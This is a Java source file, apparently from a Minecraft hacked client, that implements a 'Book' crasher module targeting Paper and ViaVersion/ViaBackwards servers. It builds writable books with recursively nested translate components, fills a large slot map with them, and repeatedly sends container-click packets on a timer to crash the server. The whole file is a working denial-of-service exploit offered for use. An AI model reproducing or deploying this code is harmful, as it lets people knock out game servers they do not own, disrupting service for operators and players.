package me.madeq.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import me.madeq.client.command.ArgumentType;
import me.madeq.client.module.Module;
import me.madeq.client.module.ModuleContext;
import me.madeq.client.module.ModuleType;
import me.madeq.client.protocol.Protocol;
import me.madeq.client.protocol.components.data.DataComponents;
import me.madeq.client.protocol.components.data.impl.DataWritableBookContent;
import me.madeq.client.protocol.components.data.impl.Filterable;
import me.madeq.client.protocol.components.objects.ItemStack;
import me.madeq.client.protocol.components.objects.ItemType;
import me.madeq.client.protocol.packets.PacketCodec;
import me.madeq.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class BookCrash extends Module {
	public BookCrash() {
		super("Book", "Basic Book Crasher (Paper and ViaVersion/ViaBackwards Abuser)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 100, "100");
        addArgument("chars", ArgumentType.INT, 1, 100, "100");
        addArgument("pages", ArgumentType.INT, 1, 15, "15");
        addArgument("map size", ArgumentType.INT, 1, 46, "46");
        addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1500");
        addArgument("loopAmount", ArgumentType.INT, 1, 30, "15");
    }

    private ScheduledExecutorService executorService;

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
        int chars = context.getInt("chars");
        int pages = context.getInt("pages");
        int mapSize = context.getInt("map size");
        int threadSleep = context.getInt("threadSleep");
        int loopAmount = context.getInt("loopAmount");

        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            context.sendMessage("Previous attack <red>stopped<white>!");
        }

        if (Protocol.SUPPORTED_PROTOCOLS.contains(ViaFabricPlus.getImpl().getTargetVersion().getVersion())) {
            String pageContent = "{translate:chat.type.text,with:[{text:.}]}";
            for (int i = 0; i < chars; i++)
                pageContent = pageContent.replace("text:.", "translate:chat.type.text,with:[{text:.}]");

            List<Filterable<String>> pagesList = new ArrayList<>();
            for (int i = 0; i < pages; i++)
                pagesList.add(new Filterable<>(pageContent, null));

            DataWritableBookContent dataWritableBookContent = new DataWritableBookContent(pagesList);
            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataWritableBookContent);

            ItemStack itemStack = new ItemStack(
                    ItemType.WRITABLE_BOOK.getId(ViaFabricPlus.getImpl().getTargetVersion().getVersion()),
                    1,
                    dataComponents);

            Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();
            for (int j = 0; j < mapSize; ++j)
                int2objectmap.put(j, itemStack);

            context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!isEnabled() || check.get() == loopAmount || (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    context.sendMessage("Attack <green>successful <white>finished!");
                } else {
                    PacketCodec.sendPacket(new PacketContainerClick(
                                    ViaFabricPlus.getImpl().getTargetVersion().getVersion(),
                                    0,
                                    1,
                                    10,
                                    PacketContainerClick.ContainerActionType.CLICK_ITEM,
                                    PacketContainerClick.ContainerAction.RIGHT_CLICK,
                                    itemStack,
                                    int2objectmap),
                            packets);
                }

                check.getAndIncrement();
            };
            executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);

        } else {
            context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
        }
	}

    @Override
    public void onDisconnect() {
        super.onDisconnect();
        if (executorService != null) {
            executorService.shutdownNow();
        }
    }
}
